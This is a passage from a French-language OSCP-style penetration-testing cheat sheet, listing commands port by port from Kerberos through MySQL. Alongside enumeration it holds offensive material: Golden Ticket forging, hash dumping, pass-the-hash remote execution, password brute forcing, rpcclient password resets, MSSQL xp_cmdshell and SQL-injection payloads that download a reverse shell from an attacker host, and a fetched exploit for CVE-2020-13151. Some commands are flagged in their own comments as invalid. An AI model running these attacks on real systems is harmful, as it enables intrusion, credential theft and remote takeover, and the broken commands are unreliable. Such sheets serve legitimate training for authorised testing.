rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>

```

<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>

```bash
# 1. Obtenir un ticket TGT valide avec un compte autorisé
impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>

# 2. La commande atexec ci-dessous ne forge pas un Silver Ticket ; exemple historique à ne pas reproduire tel quel
impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>

```

<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```bash
# Attention : l'exemple ci-dessous mélange des paramètres et ne constitue pas une commande Rubeus valide de Golden Ticket
rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>

```

<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
# 1. Obtenir le hash NTLM du compte krbtgt
impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>

# 2. Exemple historique de génération d'un Golden Ticket : syntaxe à vérifier selon l'outil installé
ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>

# 3. Utiliser le ticket Kerberos forgé dans le laboratoire.
impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>

# Facultatif : utiliser le ticket Kerberos forgé
impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>

```

### 110: POP3

<p class="oscp-command-note">Nmap (POP3) : lancer les scripts NSE « pop3-capabilities ».</p>

```bash
nmap -sV -p 110 --script pop3-capabilities,pop3-ntlm-info <IP_CIBLE>

```

<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
# Connectez-vous au service POP3
telnet <IP_CIBLE> 110

# Connectez-vous avec un utilisateur de test
USER <UTILISATEUR>
PASS <MOT_DE_PASSE>

# Lister les messages de la boîte (session POP3 authentifiée)
LIST

# Récupérer le premier message (session POP3 authentifiée)
RETR 1

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur POP3 à partir d'un dictionnaire.</p>

```bash
# Tester des identifiants POP3 dans un laboratoire autorisé
hydra -l <username> -P <password_list> -f <target_ip> pop3 -V

# Tester POP3S sur le port 995 (TLS implicite) dans le périmètre autorisé
hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V

```

<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
# Connectez-vous au service POP3
telnet <target_ip> 110

# Connectez-vous avec vos identifiants
USER <username>
PASS <password>

# Liste de tous les messages
LIST

# Récupérer un email spécifique par son numéro
RETR <NUMERO_MESSAGE>

# Fermer la connexion
QUIT

```

### 111: RPC

<p class="oscp-command-note">Nmap (RPC) : lancer les scripts NSE « rpcinfo ».</p>

```bash
nmap -sV -p 111 --script rpcinfo <IP_CIBLE>

```

```bash
# Interroger le service rpcbind et afficher les programmes RPC enregistrés
rpcinfo -p <IP_CIBLE>

```

<p class="oscp-command-note">Lister les exports NFS.</p>

```bash
# Afficher les exports NFS annoncés par le serveur mountd (si accessible)
showmount -e <IP_CIBLE>

```

### 135, 593: MSRPC

<p class="oscp-command-note">Nmap (MSRPC) : lancer les scripts NSE « msrpc-enum ».</p>

```bash
nmap -sV -p 135 <IP_CIBLE>

```

**Paramètres et repères :**
`rpcdump`  

```bash
# Lister les points de terminaison RPC via Impacket (outil installé requis)
impacket-rpcdump <IP_CIBLE> -port 135

```

```bash
# Identifier le service RPC sur HTTP (TCP 593)
nmap -sV -p 593 <IP_CIBLE>

```

**Paramètres et repères :**
`rpcclient`  

<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
# Connexion avec une session null
rpcclient -U '' -N <IP_CIBLE>

# Se connecter à la cible et lister les actions disponibles
rpcclient -U '' -N <IP_CIBLE> -c 'srvinfo'

# Liste de tous les utilisateurs disponibles
rpcclient -U '' -N <IP_CIBLE> -c 'enumdomusers'

# Énumérer les groupes de domaines
rpcclient -U '' -N <IP_CIBLE> -c 'enumdomgroups'

# Énumérer les utilisateurs avec un compte de domaine autorisé
rpcclient -U 'utilisateur' -W 'EXEMPLE' 192.0.2.10 -c 'enumdomusers'

```

**Paramètres et repères :**
`rpcclient`  

<p class="oscp-command-note">Définir un objet ou une configuration SQL.</p>

```sql
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts

```

```bash
# Lister les utilisateurs du domaine depuis une session rpcclient
enumdomusers

# Obtenir les détails de l'utilisateur
queryuser <0xrid>

# Obtenir des groupes d'utilisateurs
queryusergroups <0xrid>

# Résoudre un nom de compte en SID
lookupnames utilisateur

# Obtenir les alias associés à un utilisateur (selon les commandes prises en charge)
queryuseraliases [builtin|domain] <sid>

```

<p class="oscp-command-note">RPC : examiner les groupes, utilisateurs et identifiants disponibles.</p>

```bash
# Liste des groupes
enumdomgroups

# Obtenir les détails du groupe
querygroup <0xrid>

# Obtenir des membres du groupe
querygroupmem <0xrid>

```

```bash
# Liste des alias
enumalsgroups <builtin|domain>

# Lister les membres d'un alias
queryaliasmem builtin|domain <0xrid>

```

```bash
# Liste des domaines
enumdomains

# Interroger le SID et les informations de politique du domaine
lsaquery

# Obtenir des informations de domaine
querydominfo

```

<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-brute ».</p>

```bash
# Nmap : vérifier la présence du service SMB
nmap -sV -p 445 192.0.2.10

# CrackMapExec
crackmapexec smb <IP> -u 'admin' -p wordlist_pass.txt
# Autre possibilité
crackmapexec smb <IP> -u 'wordlist_user.txt' -p password

# Énumérer les SID/RID via Impacket avec un compte de laboratoire autorisé
impacket-lookupsid 'exemple.local/utilisateur@192.0.2.10'

```

<p class="oscp-command-note">Localiser les fichiers correspondant aux critères indiqués.</p>

```bash
# Résoudre un nom de compte en SID
lookupnames <username>

# Trouver d'autres SID
lsaenumsid

# Résoudre un SID connu (ne lance pas de balayage RID)
lookupsids S-1-5-21-111111111-222222222-333333333-500

```

**Paramètres et repères :**
`rpcclient`  

<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
rpcclient -N <target_ip> -U '<username>%<password>' -c "setuserinfo2 <target_username> 23 '<new_password>'"
# Autre possibilité
rpcclient -U "" -N <ip> -c "setuserinfo2 <USER> 23 <NEW_PASSWORD>"

```

**Paramètres et repères :**
`setuserinfo` · `rpcclient` · `level` · `setuserinfo2`  

### 139, 445: SMB

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Nmap : contrôler les ports SMB 139/445 et relever les informations du système via NSE.</p>

```bash
# Scanner les ports et services avec Nmap
nmap -sV -p 139,445 <IP_CIBLE>
nmap -p 139,445 --script smb-os-discovery <IP_CIBLE>

# Analyser les services NetBIOS
sudo nbtscan -r 192.168.50.0/24

# Windows CMD : afficher les ressources partagées d'un serveur
net view \\192.0.2.10 /all

```

<p class="oscp-command-note">Nmap (SMB) : lancer les scripts NSE « smb-enum-shares ».</p>

```bash
nmap -p 445 --script smb-enum-shares <IP_CIBLE>

nmap -p 445 --script smb-enum-users <IP_CIBLE>

nmap -p 445 --script smb-enum-domains,smb-enum-groups,smb-enum-shares,smb-enum-users <IP_CIBLE>

nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 <ip>

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <ip>

```

<p class="oscp-command-note">Observer le trafic SMB et lister les partages accessibles.</p>

```bash
# Capturer les échanges NetBIOS sur TCP 139 ; ce filtre ne décode pas SMB
sudo ngrep -d eth0 '' 'tcp port 139'

# Lister les partages SMB accessibles sans mot de passe
smbclient -L //<IP_CIBLE> -N

```

**Paramètres et repères :**
`smbmap`  

<p class="oscp-command-note">Lister les partages SMB et leurs permissions.</p>

```bash
smbmap -H <IP_CIBLE>
smbmap -u '' -p '' -H <IP_CIBLE>
smbmap -u 'guest' -p '' -H <IP_CIBLE>
smbmap -u '' -p '' -H <IP_CIBLE> -R

```

<p class="oscp-command-note">Interroger le service SMB avec CrackMapExec.</p>

```bash
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u guest -p "" --rid-brute
crackmapexec smb <IP> -u '[user]' -p '[password]'

```

<p class="oscp-command-note">Examiner les informations SMB et du domaine.</p>

```bash
# Énumérer les informations SMB/NetBIOS accessibles avec enum4linux
enum4linux -a <IP_CIBLE>
enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>

# Énumérer les utilisateurs accessibles via RPC/SMB
enum4linux -U <IP_DC>

# Lister les partages SMB annoncés par la cible
enum4linux -S <IP_CIBLE>

enum4linux -a -M -l -d <ip> 2>&1
enum4linux -a -u "" -p "" <ip>
enum4linux -a -u "guest" -p "" <ip>
enum4linux -a -u "[user]" -p "[password]" <ip>

```

```bash
# Lister les partages SMB ; -N désactive la demande de mot de passe
smbclient --no-pass -L //<IP_CIBLE>
smbclient -L //<IP_CIBLE> -U <UTILISATEUR>
smbclient //<IP>/<SHARE>
smbclient -N //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *" # Change the timeout to download big files

# Pour ajuster le délai, utiliser l'option -t au lancement de smbclient
help
# Exemple hors session : smbclient -t 100 -L //192.0.2.10 -N

# Dans une session smbclient interactive : désactiver la confirmation et récupérer récursivement
prompt OFF
recurse ON
mget *

```

<p class="oscp-command-note">Tester les identifiants fournis sur le service SMB avec CrackMapExec.</p>

```bash
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV

```

<p class="oscp-command-note">Créer un répertoire.</p>

```bash
# Monter un partage SMB autorisé dans un répertoire local (installer cifs-utils)
mkdir -p /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share

```

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```bash
# Impacket PsExec (vérifier l'installation du paquet Impacket)
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# WMIexec
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# SMBexec
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# ATExec (Impacket)
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

```

```bash
# Identifiants
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass-the-Hash
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Vérification avec CrackMapExec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec

```

<p class="oscp-command-note">Impacket : ouvrir une session ou exécuter une commande distante selon les droits disponibles.</p>

```bash
# Identifiants
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass-the-Hash
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Vérification avec CrackMapExec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --exec-method wmiexec -x 'whoami'
crackmapexec smb <IP> -u <USER> -H <NTHASH> --exec-method wmiexec -x 'whoami'

```

#### Découverte des partages sans mot de passe

Tester l'énumération anonyme et noter un refus d'accès comme un résultat normal.

<p class="oscp-command-note">Découverte des partages sans mot de passe.</p>

```bash
smbclient -L //<IP_CIBLE> -N
enum4linux-ng -A <IP_CIBLE>
```

#### Partages accessibles avec un compte de test

Lister uniquement les ressources visibles pour le compte fourni dans le périmètre.

<p class="oscp-command-note">Partages accessibles avec un compte de test.</p>

```bash
nxc smb <IP_CIBLE> -u '<UTILISATEUR>' -p '<MOT_DE_PASSE>' --shares
```

### 143, 993: IMAP

<p class="oscp-command-note">Nmap (IMAP) : lancer les scripts NSE « imap-ntlm-info ».</p>

```bash
nmap -sV -p 143,993 --script imap-ntlm-info <IP_CIBLE>

```

<p class="oscp-command-note">Examiner une connexion TLS ou un certificat.</p>

```bash
openssl s_client -connect <IP_CIBLE>:993

```

<p class="oscp-command-note">Rechercher des références de vulnérabilités connues.</p>

```bash
searchsploit 'imap' '<VERSION>'

```

<p class="oscp-command-note">Exécuter check_imap.py avec les paramètres indiqués pour «IMAP».</p>

```bash
# Utilisation
python3 check_imap.py <IP_CIBLE> <PORT_IMAP>

```

<p class="oscp-command-note">Script Python : implémentation de «IMAP».</p>

```python
import imaplib
import sys

def check_imap_capabilities(host, port):
    if port == 993:
        mail = imaplib.IMAP4_SSL(host, port=port, timeout=10)
    else:
        mail = imaplib.IMAP4(host, port=port, timeout=10)
    
    print(mail.capabilities)
    mail.logout()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Utilisation : python3 check_imap.py <hôte> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    check_imap_capabilities(host, port)

```

#### Bannière IMAP et TLS

Examiner le certificat d'un service IMAPS sans tenter d'authentification.

<p class="oscp-command-note">Bannière IMAP et TLS.</p>

```bash
openssl s_client -connect <IP_CIBLE>:993 -servername <NOM_DNS> -brief
```

### 161 (UDP): SNMP

<p class="oscp-command-note">Nmap (161) : lancer les scripts NSE « snmp-* ».</p>

```bash
sudo nmap -sU --open -p 161 <RESEAU_CIDR> -oG open-snmp.txt

sudo nmap -sU -p 161 --script 'snmp-info,snmp-sysdescr' <IP_CIBLE>

sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=communautes.txt <IP_CIBLE>

```

<p class="oscp-command-note">Interroger les paramètres SNMP.</p>

```bash
# Version: 1, 2c, 3
# Chaînes de communauté SNMP possibles : public, private, security, etc.
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> .1

```

<p class="oscp-command-note">Énumérer SNMP avec une communauté autorisée et examiner les résultats.</p>

```bash
# Dictionnaire SNMP : vérifier la présence de SecLists dans /usr/share/seclists/Discovery/SNMP/

# Tester des chaînes de communauté SNMP dans le laboratoire
onesixtyone -c communautes.txt <IP_CIBLE>

# Interroger un OID SNMP précis (remplacer OID par sa valeur numérique) accessibles
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE>

# Parcourir les objets SNMP avec des requêtes groupées
snmpbulkwalk -v2c -c <COMMUNAUTE> <IP_CIBLE>

# Afficher un résumé de la configuration SNMP
snmp-check <IP_CIBLE>

```

**Paramètres et repères :**
`onesixtyone`  

<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>

```bash
printf '%s\n' public private monitoring > communautes.txt

for hote in $(seq 1 254); do printf '192.0.2.%s\n' "$hote"; done > adresses.txt

onesixtyone -c communautes.txt -i adresses.txt

```

<p class="oscp-command-note">Interroger les paramètres SNMP.</p>

```bash
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> NET-SNMP-EXTEND-MIB::nsExtendOutputFull

```

```bash
# Interroger les objets SNMP
snmpwalk -v2c -c <COMMUNAUTE> <IP_CIBLE> <OID>

```

<p class="oscp-command-note">Identifiants SNMP (OID) et leur signification</p>

```text
1.3.6.1.2.1.25.1.6.0 --> System Processes
1.3.6.1.4.1.77.1.2.25 --> User Accounts
1.3.6.1.2.1.6.13.1.3 --> TCP Local Ports
1.3.6.1.2.1.25.4.2.1.2 --> Running Programs
1.3.6.1.2.1.25.4.2.1.4 --> Processes Path
1.3.6.1.2.1.25.2.3.1.4 --> Storage Units
1.3.6.1.2.1.25.6.3.1.2 --> Softyware Name

```

#### Information système via SNMP

Interroger l'OID system sur une instance SNMPv2c avec la communauté d'audit autorisée.

<p class="oscp-command-note">Information système via SNMP.</p>

```bash
snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.1
```

#### Services et interfaces SNMP

Lire les descriptions d'interface. Attention : SNMPv2c ne chiffre pas le trafic.

<p class="oscp-command-note">Services et interfaces SNMP.</p>

```bash
snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.2.2.1.2
```

#### SNMP-Check : inventaire du service

Sur Kali, la commande s'appelle `snmp-check` avec un tiret, même si les notes consultées écrivent `snmpcheck`. Elle utilise la communauté indiquée et ne nécessite pas d'écriture sur l'équipement. [Référence Kali](https://www.kali.org/tools/snmpcheck/).

<p class="oscp-command-note">SNMP-Check : inventaire du service.</p>

```bash
snmp-check <IP_CIBLE> -c <COMMUNAUTE>
```

#### SNMP : informations système HOST-RESOURCES-MIB

Interroger les noms de processus déclarés par l'agent. Les données dépendent du MIB et des droits de la communauté.

<p class="oscp-command-note">SNMP : informations système HOST-RESOURCES-MIB.</p>

```bash
snmpwalk -v2c -c '<COMMUNAUTE>' <IP_CIBLE> 1.3.6.1.2.1.25.4.2.1.2
```

### 389, 636, 3268 & 3269: LDAP

Examiner les objets, les droits et les services du domaine.

<p class="oscp-command-note">Nmap (LDAP) : lancer les scripts NSE « ldap* ».</p>

```bash
nmap -n -sV -p 389,636 --script ldap-rootdse <IP_DC>

```

<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
# Demande LDAP de base
ldapsearch -x -H ldap://<target_ip>

# Recherche LDAP à la racine de l’annuaire (Base DN)
ldapsearch -x -H ldap://<IP_DC> -s base -b ''

# Afficher les contextes de nommage LDAP
ldapsearch -x -H ldap://<IP_DC> -s base -b '' namingContexts

# Effectuer une recherche à partir d’un DN de base précis (Base DN)
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"

# Énumérer les utilisateurs utilisant LDAP
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"

# Récupérer le nom de compte des utilisateurs
ldapsearch -LLL -x -H ldap://<IP_DC> -b 'DC=exemple,DC=local' '(objectClass=user)' sAMAccountName

# Rechercher avec les filtres
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"

# Recherche avec authentification
ldapsearch -x -H ldap://<IP_DC> -D 'utilisateur@exemple.local' -W -b 'DC=exemple,DC=local' '(objectClass=*)'

# Filtres de recherche.
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>"

# Précise la valeur ou le terme à retourner.
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>

```

<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>

```

<p class="oscp-command-note">Filtres LDAP à insérer dans ldapsearch : ces expressions ne s’exécutent pas dans Bash.</p>

```text
# Termes de recherche pour trouver les mots de passe Cleartext
# Rechercher ms-MCS-AdmPwd (mots de passe de l'administrateur local)
(ms-MCS-AdmPwd=*)

# Rechercher les attributs contenant 'password' dans la description
(description=*password*)

# Rechercher le délai d'expiration de LAPS (pour identifier la gestion de mot de passe potentielle)
(ms-MCS-AdmPwdExpirationTime=*)

# Rechercher des mots de passe faibles communs dans des attributs comme la description
(description=*(123456*|password*|qwerty*|letmein*))

# Filtres de recherche LDAP courants
# Rechercher tous les utilisateurs
(objectClass=user)

# Rechercher tous les ordinateurs
(objectClass=computer)

# Rechercher tous les groupes
(objectClass=group)

# Rechercher les comptes désactivés (Disabled Accounts)
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Rechercher les comptes non désactivés avec un mot de passe défini
(& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Rechercher les membres d’un groupe (Group Membership)
(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Rechercher des utilisateurs avec des attributs spécifiques
# Pour les utilisateurs ayant un domaine de messagerie spécifique
(mail=*@example.com)
# Pour les utilisateurs ayant un titre spécifique
(title=Manager)

# Recherche par attribut LDAP

# Recherche du dernier jeu de mots de passe
(pwdLastSet=*)

# Rechercher les comptes dont pwdLastSet est égal à 0
(& (objectClass=user)(pwdLastSet<=0))

# Recherche de comptes dans une unité organisationnelle spécifique (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Recherches liées à la sécurité

# Rechercher les comptes sans préauthentification Kerberos (AS-REP Roasting)
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Recherche de noms principaux de services (SPN)
(servicePrincipalName=*)

# Recherche d'utilisateurs délégués
(msDS-AllowedToDelegateTo=*)

# Rechercher des comptes avec des privilèges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Autres recherches LDAP utiles

# Rechercher toutes les unités organisationnelles
(objectClass=organizationalUnit)

# Recherche de services de certificat d'annuaire actif
(objectClass=cACertificate)

# Rechercher tous les attributs d'un utilisateur spécifique
(sAMAccountName=username)

# Rechercher les comptes selon leur description
(description=*keyword*)

# Rechercher tous les objets dans le répertoire
(objectClass=*)

# Recherche de comptes de service
(objectCategory=serviceAccount)

# Rechercher les comptes membres du groupe indiqué (GroupName)
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Rechercher les comptes d’ordinateur
(objectClass=computer)

# Rechercher des utilisateurs dans une unité organisationnelle spécifique (remplacer 'OU=Users')
(ou=OU=Users,DC=domain,DC=com)

# Rechercher tous les comptes avec des attributs spécifiques
(pwdLastSet=0)

```

#### Base de l'annuaire LDAP

Interroger RootDSE pour trouver les contextes de nommage, puis utiliser le DN de base approprié.

<p class="oscp-command-note">Base de l'annuaire LDAP.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -s base -b '' defaultNamingContext namingContexts
```

#### Objets utilisateurs du domaine

Lister le nom des comptes exposés à un utilisateur LDAP autorisé.

<p class="oscp-command-note">Objets utilisateurs du domaine.</p>

```bash
ldapsearch -LLL -x -H ldap://<IP_DC> -D '<DN_COMPTE>' -W -b '<DN_BASE>' '(objectClass=user)' sAMAccountName
```

### 1433: MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Nmap (MS-SQL) : lancer les scripts NSE « ms-sql-info, ms-sql-empty-password, ms-sql-xp-cmdshell ».</p>

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>

# Énumérer les informations et les configurations de la base de données MSSQL
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<username>,mssql.password=<password>,mssql.instance-name=<instance_name> -sV -p 1433 <target_ip>

```

<p class="oscp-command-note">Exécuter la commande distante indiquée via MSSQL avec CrackMapExec (droits requis).</p>

```bash
# Vérifiez le service MSSQL et exécutez la commande
crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami" <target_ip>

# Interroger les bases de données et les énumérer
crackmapexec mssql -d <domain> -u <username> -p <password> -x "SELECT name FROM master.dbo.sysdatabases;" <target_ip>

```

<p class="oscp-command-note">MSSQL : se connecter à l'instance SQL avec le compte autorisé.</p>

```bash
# Connectez-vous à MSSQL en utilisant sqsh (Linux)
sqsh -S <target_ip> -U <username> -P <password>

# Connectez-vous à MSSQL en utilisant sqsh (Windows)
sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>

```

<p class="oscp-command-note">Instruction SQL dans la rubrique « 1433: MSSQL ».</p>

```sql
-- Activer les options avancées and xp_cmdshell for command execution
EXEC SP_CONFIGURE 'show advanced options', 1;
RECONFIGURE;
GO

EXEC SP_CONFIGURE 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- Tester xp_cmdshell pour exécuter une commande système
EXEC xp_cmdshell 'whoami';
GO

-- Télécharger puis lancer un shell inversé
EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
GO

EXEC xp_cmdshell 'c:\\Users\\Public\\reverse.exe';
GO

```

```sql
-- Exemple d'injection SQL permettant de tester l'exécution de commandes
test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--

```

```sql
-- Lister les bases de données
SELECT name FROM master.dbo.sysdatabases
                
-- Lister les tables de la base courante
SELECT * FROM information_schema.tables;

-- Afficher les données d'une table
SELECT * FROM <table_name>;

-- Rechercher des données dans une table
SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';

-- Insérer une ligne dans la table
INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');

-- Modifier une ligne dans la table
UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;

-- Supprimer une ligne de la table
DELETE FROM <table_name> WHERE <condition>;

```

#### Client SQL Server avec authentification Windows

Vérifier le type d'authentification demandé par l'instance MSSQL.

<p class="oscp-command-note">Client SQL Server avec authentification Windows.</p>

```bash
impacket-mssqlclient '<DOMAINE>/<UTILISATEUR>:<MOT_DE_PASSE>@<IP_CIBLE>' -windows-auth
```

### 2049: NFS

<p class="oscp-command-note">Nmap (NFS) : lancer les scripts NSE « nfs-showmount, nfs-ls, nfs-statfs ».</p>

```bash
nmap -sV -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs <IP_CIBLE>

```

<p class="oscp-command-note">Lister les exports NFS.</p>

```bash
# Afficher les partages NFS de la cible
showmount -e <IP_CIBLE>

# Afficher les informations de montage pour la cible
showmount <IP_CIBLE>

```

<p class="oscp-command-note">Créer un répertoire.</p>

```bash
# Créer un répertoire local pour monter le partage NFS
mkdir -p /mnt/partage_nfs

# Monter la part NFS
sudo mount -t nfs -o ro,vers=3 <IP_CIBLE>:/export/partage /mnt/partage_nfs

```

### 3003: CGMS (possible)

<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «CGMS (possible)».</p>

```bash
# Connexion au service
nc -nv <target_ip> 3003

# Obtenez une liste des commandes disponibles
help

# Vérifiez la version du service CGMS
version

```

<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
# Télécharger le script d'exploitation
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py

# Exécuter le script avec les paramètres appropriés
python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=<local_ip> --lport=443

# Démarrez un écouteur Netcat sur votre machine locale
nc -nlvp 443

```

<p class="oscp-command-note">Commandes internes CGMS : à saisir dans son interface après connexion, pas dans PowerShell.</p>

```text
bins
build
build_os
build_time
cluster-name
config-get
config-set
digests
dump-cluster
dump-fabric
dump-hb
dump-hlc
dump-migrates
dump-msgs
dump-rw
dump-si
dump-skew
dump-wb-summary
eviction-reset
feature-key
get-config
get-sl
health-outliers
health-stats
histogram
jem-stats
jobs
latencies
log
log-set
log-message
logs
mcast
mesh
name
namespace
namespaces
node
physical-devices
quiesce
quiesce-undo
racks
recluster
revive
roster
roster-set
service
services
services-alumni
services-alumni-reset
set-config
set-log
sets
show-devices
sindex
sindex-create
sindex-delete
sindex-histogram
statistics
status
tip
tip-clear
truncate
truncate-namespace
truncate-namespace-undo
truncate-undo
version

```

### 3306: MYSQL

Examiner les connexions, la configuration et les requêtes de la base de données.

<p class="oscp-command-note">Nmap (MYSQL) : lancer les scripts NSE « mysql-audit, mysql-databases, mysql-dump-hashes ».</p>

```bash
nmap -sV -p 3306 --script mysql-info,mysql-variables <IP_CIBLE>

```

<p class="oscp-command-note">MySQL : lister les bases avec le client mysql natif ; -p demande le mot de passe.</p>

```bash
mysql -h <IP_CIBLE> -u <UTILISATEUR> -p -e 'SHOW DATABASES;'

```

<p class="oscp-command-note">Hydra : tester des identifiants autorisés sur MYSQL à partir d'un dictionnaire.</p>

```bash
# Tester les identifiants MySQL par force brute avec Hydra
hydra -l <username> -P <password_list> -s 3306 -vV <IP> mysql

```

<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
mysql -h <IP_CIBLE> -u <UTILISATEUR> -p <BASE_DE_DONNEES>

```

<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>

```sql
SHOW DATABASES;

USE <database_name>;

SHOW TABLES;

DESCRIBE <table_name>;

SELECT * FROM <table_name>;

```

```sql
